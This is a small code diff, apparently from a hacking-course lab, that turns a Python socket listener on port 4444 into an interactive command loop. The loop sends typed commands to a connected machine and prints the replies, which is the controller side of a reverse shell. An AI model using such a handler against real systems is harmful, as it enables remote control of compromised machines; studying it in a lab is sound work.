@@ -9,5 +9,11 @@ listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 listener.bind(("10.0.2.15", 4444))
 listener.listen(0)
 print("[+] Waiting for incoming connection...")
-listener.accept()
-print("[+] Connection received!")
+connection, address = listener.accept()
+print(f"[+] Connection established! Source: {address}.")
+
+while True:
+    command = input(" >> ")
+    connection.send(command.encode(errors="replace"))
+    result = connection.recv(1024).decode(errors="replace")
+    print(result)
